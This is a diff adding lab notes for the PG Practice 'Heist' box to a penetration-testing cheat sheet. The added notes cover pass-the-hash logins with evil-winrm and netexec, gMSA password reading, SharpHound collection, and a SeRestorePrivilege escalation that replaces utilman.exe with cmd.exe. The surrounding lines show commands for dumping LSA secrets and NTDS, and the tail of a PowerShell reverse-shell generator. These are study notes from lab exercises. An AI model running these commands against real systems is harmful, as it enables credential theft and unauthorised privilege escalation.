@@ -695,12 +695,17 @@ atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
 ```
 
 ## Evil-Winrm
+- If evil-winrm us not working for services try the username$ doller sign at end of user
 
 ```bash
 ##winrm service discovery
 nmap -p5985,5986 <IP>
 5985 - plaintext protocol
 5986 - encrypted
+
+# Doller Sign for Heist from PG Practice
+netexec winrm 192.168.177.165 -u svc_apache$ -H FC258E893FBB2444E5E7327348164F4A # Checking for shell
+evil-winrm -u svc_apache$ -H FC258E893FBB2444E5E7327348164F4A -i heist.offsec
 
 ##Login with password
 evil-winrm -i <IP> -u user -p pass
@@ -1512,10 +1517,11 @@ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www
 
 ```
 
-### MSSQL creds from .xlsm file MS Excel macro 
+### MSSQL creds from .xlsm file MS Excel macro & Secure Web Browser
 - I had a situation, where smb, mssql ports open, not creds to login with SQL, so dig into smb found that .xlsm so it is microsoft execl macro.
 - To open that file we need a oletools
 - Reference HTB - Querier, another [article](https://medium.com/@PenSunset/querier-hackthebox-walkthrough-c6baf9df0d14)
+- Reference Pg Pracrice - Heist Secure Web Browser, through responder got hash.
 ```powershell
 #install oletools, Already their a pyhton virtual environment in my machine at (source /home/kali/HTB/HTB/Chaos/myenv/bin/activate).
 pip install -U oletools
@@ -2575,6 +2581,20 @@ john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
 1. Use Mimikatz
 2. If this is a domain joined machine, run BloodHound.
 
+## SeRestorePrivilege Escalation windows
+- If you have the privilege to SeRestorePrivilege example Heist from PG Practive
+- Enable [scrit](https://raw.githubusercontent.com/gtworek/PSBits/refs/heads/master/Misc/EnableSeRestorePrivilege.ps1), move utilman into .bak then move the cmd.exe to utilman.exe
+- Another way is xct executable file this box not working on Heist [video](https://www.youtube.com/watch?v=1nRzABu6eKU) here the ran script with powershell oneliner got shell.
+-After doing that shell will be <b>shorter time</b>.
+
+```powershell
+. .\EnableSeRestorePrivilege.ps1
+Enable-SeRestorePrivilege
+whoami /all # End you can see that USER CLAIMS Information User claims unknow
+move utilman.exe utilman.exe.bak
+move cmd.exe utilman.exe
+rdesktop heist.offsec # after open windows machine press WINDOWS+U it will open the cmd prompt got shell. remember shell will shorter time
+```
 ---
 
 # Active Directory Pentesting
@@ -2659,6 +2679,7 @@ Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration |
 - If you don't have login with Windows AD box we can try [Gitub](https://github.com/dirkjanm/BloodHound.py)
 
 ```powershell
+.\SharpHound.exe -c all,gpolocalgroup # With exe need to specify the  all,gpolocalgroup
 # Sharphound - transfer sharphound.ps1 into the compromised machine
 Import-Module .\Sharphound.ps1 
 Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
@@ -2956,6 +2977,7 @@ xfreerdp /u:administrator /p:'BJhN#,lU/9gvqN' /v:192.168.154.122 /smart-sizing:1
 ### crackmapexec
 
 - If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
+- If evil-winrm us not working for services try the username$ doller sign at end of user
 
 ```powershell
 crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
@@ -2974,6 +2996,10 @@ crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secret
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command
+
+#Doller Sign Heist box from PG Practice
+netexec winrm 192.168.177.165 -u svc_apache -H FC258E893FBB2444E5E7327348164F4A
+evil-winrm -u svc_apache$ -H FC258E893FBB2444E5E7327348164F4A -i heist.offsec
 
 #Pass the hash
 crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
@@ -3113,6 +3139,14 @@ payload = payload % (ip, port)
 cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
 print(cmdline)
+```
+### ReadGMSAPAssword in Active Directory
+- In the bloodhound identified that user can able to read the SGMA password for svc_apache user.
+- Initially tried with Hiest box for PGPractice create of the box enox github has file GMSAPasswordReader.exe is not compatible in the box.
+- Tried this PowerShell script from [github](https://github.com/ricardojba/Invoke-GMSAPasswordReader/)
+```powershell
+. .\Invoke-GMSAPasswordReader.ps1 # You can user Import-Module as well
+Invoke-GMSAPasswordReader -Command "--AccountName svc_apache"
 ```
 
 ### Generic All permission in Active Directory 
